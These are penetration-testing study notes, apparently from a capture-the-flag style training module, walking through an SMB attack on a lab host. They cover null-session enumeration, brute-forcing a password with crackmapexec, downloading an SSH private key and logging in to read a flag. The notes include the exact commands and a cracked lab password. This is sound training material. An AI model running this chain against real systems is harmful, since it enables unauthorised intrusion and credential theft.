## ID
107

## Module
Attacking Common Services

## Kind
notes

## Title
Section 7 — Attacking SMB

## Description
Full attack chain on SMB: enumerate shares and permissions, discover users via RPC, brute‑force passwords with crackmapexec, download an SSH private key, and finally SSH into the target to retrieve the flag.

## Tags
smb, enumeration, null-session, brute-force, ssh, private-key, rpc, crackmapexec

## Commands
- smbmap -H <TARGET_IP>
- smbmap -H <TARGET_IP> -r <SHARE>
- enum4linux-ng <TARGET_IP> -A
- crackmapexec smb <TARGET_IP> -u <USER> -p <WORDLIST> --local-auth
- smbclient //<TARGET_IP>/<SHARE> -U <USER>
- chmod 600 <KEYFILE>
- ssh -i <KEYFILE> <USER>@<TARGET_IP>
- cat flag.txt

## What This Section Covers
SMB (Server Message Block) is often misconfigured to allow null session enumeration. Attackers can list shares, discover local users, check password policy (lockout threshold), and then brute‑force credentials. With valid credentials, they can download sensitive files (e.g., SSH private keys) and pivot to remote access.

## Methodology

1. **Enumerate shares & permissions** – Use `smbmap` to find readable shares (e.g., `GGJ`).
2. **User enumeration** – Run `enum4linux-ng` to list local users and verify null session access.
3. **Check password policy** – Look for “lockout threshold: None” – safe to brute‑force.
4. **Brute‑force password** – Use `crackmapexec` with a wordlist against the discovered user.
5. **Download private key** – Use `smbclient` with the found credentials to download `id_rsa`.
6. **SSH into target** – Set correct permissions on the key (`chmod 600`) and connect.
7. **Capture the flag** – Find and read `flag.txt`.

## Multi‑step Workflow

```bash
# Step 1 – Enumerate shares
smbmap -H 10.129.203.6
# Output shows GGJ share: READ ONLY, contains id_rsa

# Step 2 – Enumerate users and policy
enum4linux-ng 10.129.203.6 -A
# Users: jason, robin; Lockout threshold: None

# Step 3 – Brute‑force jason's password
crackmapexec smb 10.129.203.6 -u jason -p pws.list --local-auth
# [+] jason:34c8zuNBo91!@28Bszh

# Step 4 – Download SSH private key
smbclient //10.129.203.6/GGJ -U jason
# Password: 34c8zuNBo91!@28Bszh
smb: \> get id_rsa
smb: \> exit

# Step 5 – SSH with the key
chmod 600 id_rsa
ssh -i id_rsa jason@10.129.203.6

# Step 6 – Get the flag (inside SSH session)
cat flag.txt

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|common-services]]  
← [[06-ftp-latest-vulns]] | [[08-smb-latest-vulns]] →
<!-- AUTO-LINKS-END -->
